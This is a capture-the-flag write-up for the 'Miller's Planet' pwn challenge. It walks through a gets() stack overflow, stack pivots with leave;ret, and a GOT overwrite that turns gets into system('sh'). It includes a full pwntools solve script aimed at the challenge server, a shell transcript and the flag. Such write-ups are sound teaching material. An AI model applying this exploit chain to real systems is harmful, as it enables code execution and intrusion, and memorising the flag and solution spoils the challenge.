# Miller's Planet

**Category:** PWN
**Difficulty:** Medium-Hard
**Flag:** `UVT{wh0_n33d5_10_stdfile_0_l0ck_wh3n_y0u_hav3_r0p_bWlsbGVyIHMgcGxhbmV0IGlzIGNyYXp5}`

## Description

> In March 2026, humanity sent a crew through a wormhole...

An Interstellar / Miller's Planet themed binary exploitation challenge. We are given a stripped 64-bit ELF binary along with its libc and ld-linux loader.

## TL;DR

Stack buffer overflow via `gets()` with no canary and no PIE. The binary has **no `pop rdi; ret` gadget**, so a traditional ROP chain is not directly possible. We exploit a multi-purpose code gadget that sets `rdi = [rbp - 0x110]` then calls `gets()` through the GOT. By chaining multiple invocations of this gadget via `leave; ret` stack pivots, we: (1) pivot the stack to a RW memory page, (2) overwrite `gets@GOT` with `system@plt`, and (3) trigger `system("sh")` using a `"sh\0"` string found in `.dynstr`.

## Analysis

### Binary properties

```
$ file miller
miller: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped

$ checksec miller
    Arch:     amd64-64-little
    RELRO:    Partial RELRO    ← GOT is writable!
    Stack:    No canary found  ← no stack cookie
    NX:       NX enabled       ← no shellcode on stack
    PIE:      No PIE (0x3fc000) ← fixed addresses
```

Notable: the binary has an unusual base address of `0x3fc000` instead of the standard `0x400000`. The custom interpreter path `/home/razvan/test/ld-linux-x86-64.so.2` means we need the provided `ld-linux-x86-64.so.2` to run locally via `./ld-linux-x86-64.so.2 ./miller`.

### GOT layout

```
__libc_start_main   @ 0x404fd8
puts                @ 0x405000
system              @ 0x405008
printf              @ 0x405010
getchar             @ 0x405018
gets                @ 0x405020   ← target for overwrite
malloc              @ 0x405028   ← 8 bytes after gets (will be corrupted)
fflush              @ 0x405030
__isoc99_scanf      @ 0x405038
```

### Vulnerable function (0x4013a0)

The main vulnerability is straightforward. The function:

1. Calls `malloc(0x200)` and stores the heap pointer at `[rbp-0x8]`.
2. Asks the user: *"What size will have your message"* and reads an integer via `scanf("%d")`.
3. **If size ≤ 0x100** (the "small" path): calls `gets()` on a **stack buffer** at `[rbp-0x110]`.
4. **If size > 0x100** (the "large" path): calls `gets()` on the **heap buffer** from step 1.

Both paths use `gets()`, which reads unlimited input — a classic unbounded buffer overflow. The small path is exploitable because the stack buffer is only `0x110` bytes from `rbp`, meaning we overflow directly into the saved `rbp` and return address.

```asm
; The "small message" path (size <= 0x100):
0x401450:  lea rax, [rbp-0x110]    ; buffer start
0x401457:  mov rdi, rax            ; rdi = buffer
0x40145a:  mov eax, 0x0
0x40145f:  call gets@plt           ; gets(buffer) — unlimited read!
0x401464:  nop
0x401465:  leave                   ; mov rsp,rbp; pop rbp
0x401466:  ret
```

### The challenge: no `pop rdi; ret`

Running ROPgadget on the binary reveals **there is no `pop rdi; ret` gadget**. This means we cannot directly set `rdi` to an arbitrary value for a function call like `system("/bin/sh")`.

However, we have something almost as useful — the code starting at `0x401450`:

```asm
; "gets_call" gadget at 0x401450:
lea rax, [rbp-0x110]    ; rax = rbp - 0x110
mov rdi, rax             ; rdi = rbp - 0x110
call gets@plt            ; gets(rdi)  — calls whatever is in gets@GOT
nop
leave                    ; mov rsp,rbp; pop rbp
ret
```

This gadget is incredibly powerful because:

- **It sets `rdi`** based on `rbp`: `rdi = rbp - 0x110`. By controlling `rbp`, we control what address is passed to the function.
- **It calls through the GOT**: `call gets@plt` resolves through `gets@GOT`. If we overwrite `gets@GOT` with `system@plt`, this becomes `system(rbp - 0x110)`.
- **It chains via `leave; ret`**: After the call, `leave` sets `rsp = rbp` and pops a new `rbp`, then `ret` pops the next return address. This lets us chain multiple calls by controlling what's written at each pivoted `rbp` location.

### Memory map — finding writable pages

Since there's no PIE, all addresses are fixed. The binary has several RW LOAD segments:

| Address Range | Permissions | Usage |
|---|---|---|
| `0x3fc000 - 0x3fd000` | RW | Program headers, interp path |
| `0x3fe000 - 0x3ff000` | RW | `.dynstr`, `.dynamic`, `.dynsym` |
| `0x404df8 - 0x405058` | RW | `.init_array`, `.fini_array`, `.got`, `.got.plt`, `.bss` |

The `0x3fc` page is ideal for stack pivoting — it's writable, has ~4KB of space, and won't interfere with program execution once we've hijacked control flow.

### Finding "sh\0"

We need a pointer to a string that `system()` can execute. Since there's no `/bin/sh` in the binary, we look for alternatives:

```
$ strings -t x miller | grep "sh"
```

The `.dynstr` section at `0x3fe548` contains symbol names including `fflush`, within which we find the substring `"sh\0"` at offset `0x3fe557`. The `system()` function accepts `"sh"` just as well as `"/bin/sh"`.

## Solution

### Exploitation strategy

The exploit uses a **3-stage chain** of the `gets_call` gadget, leveraging `leave; ret` to pivot the stack between memory regions:

```
┌─────────────────────────────────────────────────────────────────┐
│ STAGE 1: Initial stack overflow                                 │
│ Buffer overflow → fake rbp → return to gets_call                │
│ gets() reads Stage 2 payload into RW page (0x3fcc00)            │
│ leave;ret pivots execution to the RW page                       │
├─────────────────────────────────────────────────────────────────┤
│ STAGE 2: RW page → GOT overwrite setup                         │
│ Chain from RW page calls gets_call again with rbp=gets@GOT+0x110│
│ gets() reads Stage 3 payload into GOT area (0x405020)           │
│ Also pre-writes the final system("sh") chain at pivot+0x230     │
├─────────────────────────────────────────────────────────────────┤
│ STAGE 3: GOT overwrite + pivot to system("sh")                 │
│ Writes system@plt to gets@GOT (0x405020)                        │
│ leave;ret pivots back to RW page (0x3fce30)                     │
│ Final gets_call: rdi = "sh" (0x3fe557), call system("sh")       │
│ → SHELL!                                                        │
└─────────────────────────────────────────────────────────────────┘
```

### Detailed walkthrough

#### Stage 1 — Stack overflow → gets(pivot)

We send a message size of `50` (≤ 0x100) to take the stack buffer path. Then we overflow:

```
┌──────────────────────────────┐
│ 'A' * 0x110                  │  ← fill stack buffer
├──────────────────────────────┤
│ pivot + 0x110 (= 0x3fcd10)  │  ← overwrite saved rbp
├──────────────────────────────┤
│ gets_call   (= 0x401450)    │  ← overwrite return address
└──────────────────────────────┘
```

When the function returns:
- `leave`: `rsp = rbp` (original), `pop rbp = pivot + 0x110 = 0x3fcd10`
- `ret`: jumps to `gets_call` (0x401450)

At `gets_call`:
- `lea rax, [rbp - 0x110]` → `rax = 0x3fcd10 - 0x110 = 0x3fcc00` (our pivot address)
- `mov rdi, rax` → `rdi = 0x3fcc00`
- `call gets` → `gets(0x3fcc00)` — reads our Stage 2 payload into the RW page

#### Stage 2 — Write chain to RW page

After `gets(0x3fcc00)` returns, execution hits `leave; ret`:
- `leave`: `rsp = rbp = 0x3fcd10`, `pop rbp = [0x3fcd10]` (what we wrote at pivot+0x110)
- `ret`: jumps to `[0x3fcd18]` (what we wrote at pivot+0x118)

We lay out the RW page as follows:

```
pivot (0x3fcc00):
  +0x000 .. +0x10f:  \x00 padding
  +0x110 (0x3fcd10): gets_got + 0x110 = 0x405130  ← new rbp (for gets to write at gets_got)
  +0x118 (0x3fcd18): gets_call = 0x401450          ← ret → gets(gets_got)
  +0x120 .. +0x22f:  \x00 padding
  +0x230 (0x3fce30): sh_addr + 0x110 = 0x3fe667   ← rbp for final system("sh")
  +0x238 (0x3fce38): gets_call = 0x401450          ← ret → system("sh")
```

The chain at `+0x110/+0x118` triggers another `gets_call`:
- `rbp = 0x405130` → `rdi = 0x405130 - 0x110 = 0x405020 = gets@GOT`
- `call gets` → `gets(gets@GOT)` — reads our Stage 3 payload directly into the GOT!

The data at `+0x230/+0x238` is the **final chain** that will execute after the GOT overwrite.

#### Stage 3 — GOT overwrite + system("sh")

We write into the GOT area starting at `gets@GOT` (0x405020):

```
0x405020 (gets@GOT):   system@plt (0x4010c0)  ← gets is now system!
0x405028 .. 0x40512f:  \x00 padding            (corrupts malloc/fflush/scanf GOT entries)
0x405130:              pivot + 0x230 = 0x3fce30 ← rbp to pivot back to RW page
0x405138:              leave_ret = 0x401384     ← leave;ret to chain to final payload
```

After `gets(gets@GOT)` returns, the `leave; ret` at the end of `gets_call` fires:
- `leave`: `rsp = rbp = 0x405130`, `pop rbp = [0x405130] = 0x3fce30`
- `ret`: `[0x405138] = leave_ret (0x401384)`

This second `leave; ret` pivots execution back to the RW page:
- `leave`: `rsp = rbp = 0x3fce30`, `pop rbp = [0x3fce30] = sh_addr + 0x110 = 0x3fe667`
- `ret`: `[0x3fce38] = gets_call (0x401450)`

Now the final `gets_call` fires with the critical difference that `gets@GOT` now points to `system@plt`:
- `lea rax, [rbp - 0x110]` → `rax = 0x3fe667 - 0x110 = 0x3fe557` = address of `"sh\0"` in `.dynstr`
- `mov rdi, rax` → `rdi = 0x3fe557` → points to `"sh"`
- `call gets@plt` → resolves through GOT → **`call system("sh")`**

**Shell obtained!**

> **Note on GOT corruption**: Overwriting `gets@GOT` necessarily corrupts adjacent GOT entries (`malloc`, `fflush`, `scanf`) with zeros. This is acceptable because `system("sh")` for such a simple command does not call `malloc` internally — it uses `fork()` + `execve()` which bypass the corrupted entries.

### Prerequisites

```bash
pip install pwntools --break-system-packages
```

### Solve Script

```python
#!/usr/bin/env python3
# solve.py — millers-planet solver
# GOT overwrite: gets@GOT -> system@plt, then system("sh") via gets_call gadget
# Uses "sh\0" string found in .dynstr at 0x3fe557
from pwn import *
import sys, time

context.binary = './files/miller'

e = ELF('./files/miller')

REMOTE_HOST = sys.argv[1] if len(sys.argv) >= 3 else '194.102.62.166'
REMOTE_PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 23444

# Binary addresses (no PIE, base 0x3fc000)
gets_got    = e.got['gets']       # 0x405020
system_plt  = 0x4010c0
sh_addr     = 0x3fe557            # "sh\0" in .dynstr
pivot       = 0x3fcc00            # RW page with plenty of stack
gets_call   = 0x401450            # lea rax,[rbp-0x110]; mov rdi,rax; call gets; leave; ret
leave_ret   = 0x401384            # leave; ret

def exploit(p):
    p.recvuntil(b'message', timeout=15)
    p.recvline()
    p.sendline(b'50')
    p.recvuntil(b'message', timeout=10)
    p.recvline()

    # Stage 1: stack overflow -> gets(pivot=0x3fcc00) via gets_call gadget
    # Set rbp = pivot+0x110 so rdi = pivot, gets reads into RW page
    payload1 = b'A' * 0x110
    payload1 += p64(pivot + 0x110)   # fake rbp -> rdi = pivot
    payload1 += p64(gets_call)       # gets(pivot), then leave;ret
    p.sendline(payload1)
    time.sleep(0.5)

    # Stage 2: write chain to pivot, set up GOT overwrite + final system("sh")
    # [pivot+0x110] -> rbp for gets(gets_got)
    # [pivot+0x118] -> gets_call to trigger GOT overwrite
    # [pivot+0x230] -> rbp for system("sh") (rdi = sh_addr)
    # [pivot+0x238] -> gets_call to trigger system("sh")
    payload2 = b'\x00' * 0x110
    payload2 += p64(gets_got + 0x110)  # rbp -> gets writes to gets_got
    payload2 += p64(gets_call)         # gets(gets_got)
    payload2 += b'\x00' * (0x230 - len(payload2))
    payload2 += p64(sh_addr + 0x110)   # rbp -> rdi = sh_addr for system
    payload2 += p64(gets_call)         # system("sh")
    p.sendline(payload2)
    time.sleep(0.5)

    # Stage 3: overwrite gets@GOT with system@plt, chain back to pivot
    # [0x405020] = system_plt (gets -> system)
    # [0x405130] = pivot+0x230 (rbp to pivot back to RW page)
    # [0x405138] = leave_ret (leave;ret to reach final system("sh") chain)
    payload3 = p64(system_plt)
    payload3 += b'\x00' * (0x110 - 8)
    payload3 += p64(pivot + 0x230)     # rbp -> pivot to 0x3fc page
    payload3 += p64(leave_ret)         # leave;ret -> system("sh")
    p.sendline(payload3)
    time.sleep(1)

    log.success("Exploit sent! Trying shell...")
    p.sendline(b'id')
    p.interactive()

is_local = len(sys.argv) >= 2 and sys.argv[1] == 'local'

if is_local:
    p = process(['./files/ld-linux-x86-64.so.2', './files/miller'])
    exploit(p)
else:
    p = remote(REMOTE_HOST, REMOTE_PORT)
    exploit(p)
```

### Running the exploit

```bash
# Local
python3 solve.py local

# Remote
python3 solve.py 194.102.62.166 23444
```

```
$ python3 solve.py 194.102.62.166 23444
[+] Opening connection to 194.102.62.166 on port 23444: Done
[+] Exploit sent! Trying shell...
[*] Switching to interactive mode
$ cat flag*
UVT{wh0_n33d5_10_stdfile_0_l0ck_wh3n_y0u_hav3_r0p_bWlsbGVyIHMgcGxhbmV0IGlzIGNyYXp5}
```

## Flag

```
UVT{wh0_n33d5_10_stdfile_0_l0ck_wh3n_y0u_hav3_r0p_bWlsbGVyIHMgcGxhbmV0IGlzIGNyYXp5}
```
